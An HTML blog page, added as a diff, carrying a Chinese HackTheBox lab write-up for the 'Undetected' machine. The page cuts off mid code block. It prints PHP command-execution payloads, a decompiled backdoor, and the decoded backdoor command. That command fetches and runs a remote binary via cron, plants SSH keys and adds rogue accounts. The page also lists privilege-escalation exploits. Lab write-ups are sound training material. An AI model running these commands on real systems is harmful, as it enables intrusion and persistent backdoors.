@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox-Undetected - Mi3aka&#39;s Blog</title><meta name="Description" content="Mi3aka的博客"><meta property="og:title" content="HackTheBox-Undetected" />
+<meta property="og:description" content="HackTheBox靶机Undetected" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://mi3aka.eu.org/htb-undetected/" /><meta property="og:image" content="https://mi3aka.eu.org/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-27T14:08:30+00:00" />
+<meta property="article:modified_time" content="2022-03-27T14:08:30+00:00" /><meta property="og:site_name" content="Mi3aka&#39;s Blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mi3aka.eu.org/logo.png"/>
+
+<meta name="twitter:title" content="HackTheBox-Undetected"/>
+<meta name="twitter:description" content="HackTheBox靶机Undetected"/>
+<meta name="application-name" content="Mi3aka&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Mi3aka&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://mi3aka.eu.org/htb-undetected/" /><link rel="prev" href="https://mi3aka.eu.org/htb-paper/" /><link rel="next" href="https://mi3aka.eu.org/htb-routerspace/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox-Undetected",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/mi3aka.eu.org\/htb-undetected\/"
+        },"genre": "posts","wordcount":  1867 ,
+        "url": "https:\/\/mi3aka.eu.org\/htb-undetected\/","datePublished": "2022-03-27T14:08:30+00:00","dateModified": "2022-03-27T14:08:30+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Mi3aka"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/links/"> 友链 </a><a class="menu-item" href="https://github.com/mi3aka/huaQ" rel="noopener noreffer" target="_blank"> Sec </a><a class="menu-item" href="https://tools.mi3aka.eu.org/" rel="noopener noreffer" target="_blank"> Tool </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Mi3aka&#39;s Blog">Mi3aka</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/links/" title="">友链</a><a class="menu-item" href="https://github.com/mi3aka/huaQ" title="" rel="noopener noreffer" target="_blank">Sec</a><a class="menu-item" href="https://tools.mi3aka.eu.org/" title="" rel="noopener noreffer" target="_blank">Tool</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox-Undetected</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Mi3aka</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-27">2022-03-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 1867 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期工作">前期工作</a></li>
+    <li><a href="#获取user权限">获取user权限</a></li>
+    <li><a href="#获取root权限">获取root权限</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><a href="https://app.hackthebox.com/machines/439" target="_blank" rel="noopener noreffer ">https://app.hackthebox.com/machines/439</a></p>
+<h2 id="前期工作">前期工作</h2>
+<p>nmap扫描结果</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261639622.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261640454.png" /></p>
+<p>把<code>10.10.11.146    store.djewelry.htb</code>加到<code>/etc/hosts</code>里面</p>
+<h2 id="获取user权限">获取user权限</h2>
+<p>xray直接扫出来了&hellip;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261643629.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203261650556.png" /></p>
+<p><code>&lt;?php system(&quot;find /var/www -name '*' | xargs grep -i password&quot;);?&gt;</code></p>
+<p>没有得到有效信息,当前用户为<code>www-data</code></p>
+<p><code>&lt;?php system(&quot;cat /etc/passwd | grep sh&quot;);?&gt;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root❌0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">steven❌1000:1000:Steven Wright:/home/steven:/bin/bash
+</span></span><span class="line"><span class="cl">sshd❌112:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class="line"><span class="cl">steven1❌1000:1000:,,,:/home/steven:/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/etc/passwd</code>显示存在<code>steven</code>用户,但没有权限进入<code>/home/steven</code>因此需要先提权到<code>steven</code>或者是<code>steven1</code></p>
+<p><a href="https://www.freebuf.com/articles/network/274223.html" target="_blank" rel="noopener noreffer ">Linux权限提升：自动化信息收集</a></p>
+<p>利用<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreffer ">linPEAS</a>进行信息搜集,但信息量太大,无从下手</p>
+<p>去瞄了眼wp<a href="https://0xdedinfosec.vercel.app/posts/hackthebox-undetected-writeup" target="_blank" rel="noopener noreffer ">hackthebox-undetected-writeup</a>,别人是在路径爆破的时候得到了一个叫<code>info</code>的ELF(我跳步了&hellip;)</p>
+<p>具体路径位于<code>/var/backups/info</code></p>
+<p><code>main-&gt;check_root-&gt;check_shell-&gt;exec_shell</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">exec_shell</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-A90h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v5</span><span class="p">[</span><span class="mi">1328</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-A70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v6</span><span class="p">[</span><span class="mi">1320</span><span class="p">];</span> <span class="c1">// [rsp+550h] [rbp-540h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span> <span class="c1">// [rsp+A78h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+A80h] [rbp-10h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+A88h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">path</span> <span class="o">=</span> <span class="s">&#34;/bin/bash&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">strcpy</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a24&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;67726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;732e7478743b20726d2075736572732e7478743b&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v9</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v8</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="n">v9</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="n">v9</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span><span class="p">[</span><span class="mi">1319</span><span class="p">]</span> <span class="o">=</span> <span class="n">hexdigit2int</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="o">*</span><span class="n">v0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v1</span> <span class="o">=</span> <span class="n">v9</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v6</span><span class="p">[</span><span class="mi">1318</span><span class="p">]</span> <span class="o">=</span> <span class="n">hexdigit2int</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="o">*</span><span class="n">v1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="n">v8</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">v2</span> <span class="o">=</span> <span class="n">v6</span><span class="p">[</span><span class="mi">1318</span><span class="p">]</span> <span class="o">|</span> <span class="p">(</span><span class="mi">16</span> <span class="o">*</span> <span class="n">v6</span><span class="p">[</span><span class="mi">1319</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;-c&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">execve</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将那串16进制转换为ascii得到</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo &#34;* 3 * * * root /var/lib/.main&#34; &gt;&gt; /etc/crontab; awk -F&#34;:&#34; &#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34;1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: &gt;&gt; /etc/shadow&#34;)}&#39; /etc/passwd; awk -F&#34;:&#34; &#39;$7 == &#34;/bin/bash&#34; &amp;&amp; $3 &gt;= 1000 {system(&#34;echo &#34;$1&#34; &#34;$3&#34; &#34;$6&#34; &#34;$7&#34; &gt; users.txt&#34;)}&#39; /etc/passwd; while read -r user group home shell _; do echo &#34;$user&#34;1&#34;❌$group:$group:,,,:$home:$shell&#34; &gt;&gt; /etc/passwd; done &lt; users.txt; rm users.txt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到一个<code>/etc/shadow</code>里面的哈希<code>$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/</code>,利用cmd5对其进行反查,没有得到结果</p>
+<p>利用<code>john</code>进行手动爆破,得到<code>ihatehackers</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262117055.png" /></p>
+<p>以<code>steven1@10.10.11.146</code>成功登录</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202203262119251.png" /></p>
+<h2 id="获取root权限">获取root权限</h2>
+<p>前面用<code>linPEAS</code>得到信息,可以利用<code>CVE-2021-4034</code>进行提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-v" data-lang="v"><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="p">[</span><span class="nc">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">4034</span><span class="p">]</span> <span class="nc">PwnKit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nc">Details</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Exposure</span><span class="p">:</span> <span class="nv">probable</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Tags</span><span class="p">:</span> <span class="p">[</span> <span class="nv">ubuntu</span><span class="o">=</span><span class="mi">10</span><span class="o">|</span><span class="mi">11</span><span class="o">|</span><span class="mi">12</span><span class="o">|</span><span class="mi">13</span><span class="o">|</span><span class="mi">14</span><span class="o">|</span><span class="mi">15</span><span class="o">|</span><span class="mi">16</span><span class="o">|</span><span class="mi">17</span><span class="o">|</span><span class="mi">18</span><span class="o">|</span><span class="mi">19</span><span class="o">|</span><span class="mi">20</span><span class="o">|</span><span class="mi">21</span> <span class="p">],</span><span class="nv">debian</span><span class="o">=</span><span class="mi">7</span><span class="o">|</span><span class="mi">8</span><span class="o">|</span><span class="mi">9</span><span class="o">|</span><span class="mi">10</span><span class="o">|</span><span class="mi">11</span><span class="p">,</span><span class="nv">fedora</span><span class="p">,</span><span class="nv">manjaro</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Download</span> <span class="nc">URL</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//codeload.github.com/berdav/CVE-2021-4034/zip/main
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="p">[</span><span class="nc">CVE</span><span class="o">-</span><span class="mi">2021</span><span class="o">-</span><span class="mi">3156</span><span class="p">]</span> <span class="nv">sudo</span> <span class="nc">Baron</span> <span class="nc">Samedit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nc">Details</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="nc">Exposure</span><span class="p">:</span> <span class="nv">probable</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Tags</span><span class="p">:</span> <span class="nv">mint</span><span class="o">=</span><span class="mi">19</span><span class="p">,[</span> <span class="nv">ubuntu</span><span class="o">=</span><span class="mi">18</span><span class="o">|</span><span class="mi">20</span> <span class="p">],</span> <span class="nv">debian</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">   <span class="nc">Download</span> <span class="nc">URL</span><span class="p">:</span> <span class="nv">https</span><span class="p">:</span><span class="c1">//codeload.github.com/blasty/CVE-2021-3156/zip/main
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
